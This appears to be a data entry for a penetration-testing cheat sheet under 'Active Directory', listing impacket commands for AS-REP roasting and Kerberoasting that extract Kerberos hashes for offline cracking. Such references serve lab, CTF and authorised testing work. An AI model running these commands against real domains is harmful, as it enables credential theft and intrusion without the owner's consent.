---
title: "Active Directory"
id: "ad"
icon: "material-symbols:hub-rounded"
commands:
  - cmd: "impacket-GetNPUsers domain.local/ -usersfile users.txt -format john -dc-ip 10.10.x.x"
    desc: "AS-REP Roasting"
    difficulty: "Medium"
    tags: ["ad", "kerberos", "impacket"]

  - cmd: "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.x.x -request"
    desc: "Kerberoasting"
    difficulty: "Hard"
    tags: ["ad", "kerberos", "impacket"]
---

